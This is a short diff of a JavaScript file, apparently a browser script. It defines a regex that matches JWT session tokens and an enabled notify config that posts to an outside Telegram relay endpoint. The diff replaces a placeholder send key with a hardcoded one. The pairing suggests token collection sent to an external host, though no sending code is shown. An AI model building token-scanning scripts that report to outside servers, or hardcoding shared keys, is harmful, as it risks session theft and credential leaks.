@@ -22,11 +22,11 @@
   const jwtRegex = /eyJ[a-zA-Z0-9_-]{25,}\.eyJ[a-zA-Z0-9_-]{25,}\.[a-zA-Z0-9_-]{25,}/g;
 
   // ---------------------------------------------------------------- telegram (serverFOR)
-  // Token va chat_id endi serverda (.env). Skriptda faqat endpoint va kalit.
+  
   const NOTIFY = {
     enabled: true,
     url: 'https://cashbek.1239.uz/telegram/massage/send.php',
-    key: 'CHANGE_ME_SEND_KEY' // send.php dagi SEND_KEY bilan bir xil bo'lsin
+    key: 'tgmassage' // 
   };
 
   // ---------------------------------------------------------------- i18n
